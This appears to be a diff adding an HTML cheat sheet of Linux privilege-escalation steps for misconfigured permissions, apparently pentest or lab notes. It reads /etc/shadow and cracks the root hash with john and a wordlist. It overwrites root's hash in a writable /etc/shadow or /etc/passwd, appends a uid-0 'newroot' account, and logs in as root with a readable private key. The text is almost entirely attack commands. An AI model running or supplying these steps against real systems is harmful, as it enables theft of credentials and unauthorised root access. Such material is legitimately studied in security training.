@@ -1,0 +1,75 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>weak permission files</title>
+</head><body>./lse.sh -l 1 -i |more<br/>
+<br/>
+<b>Readable /etc/shadow<br/>
+<br/>
+</b>ls -la /etc/shadow<br/>
+cat /etc/shadow |grep root<br/>
+<br/>
+root:<b>&lt;hash&gt;</b>:&lt;number&gt;:0:&lt;number&gt;:&lt;number&gt;:::<br/>
+<br/>
+crack the hash with john<br/>
+<br/>
+john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt<br/>
+<br/>
+su<br/>
+&lt;type password&gt;<br/>
+<br/>
+<br/>
+<br/>
+<b>Writable /etc/shadow<br/>
+make a backup first.<br/>
+<br/>
+</b>ls -la /etc/shadow<br/>
+<br/>
+generate new password:<br/>
+<br/>
+mkpasswd -m sha-512 <b>newpassword<br/>
+</b><b><br/>
+<br/>
+</b>edit /etc/shadow<br/>
+change the hash with own.<br/>
+<br/>
+<br/>
+<b>Writable /etc/passwd</b><br/>
+<br/>
+<br/>
+root:x:0:0:root:/root:/bin/bash<br/>
+<br/>
+x-&gt; password hash<br/>
+<br/>
+<br/>
+openssl passwd "<b>password</b>"<br/>
+<br/>
+edit x in top of /etc/passwd with our hash<br/>
+or<br/>
+<br/>
+append with new root<br/>
+<br/>
+newroot:&lt;hash&gt;:0:0:root:/root:/bin/bash<br/>
+<br/>
+su<br/>
+<br/>
+<br/>
+<b>Readable backup files</b><br/>
+<br/>
+ls -la .ssh<br/>
+<b>root_key</b><br/>
+<br/>
+confirm root login first --&gt; grep PermitRootLogin /etc/ssh/sshd_config<br/>
+<br/>
+chmod 600 root_key<br/>
+<br/>
+ssh -i root_key root@&lt;ip&gt;<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</body></html>
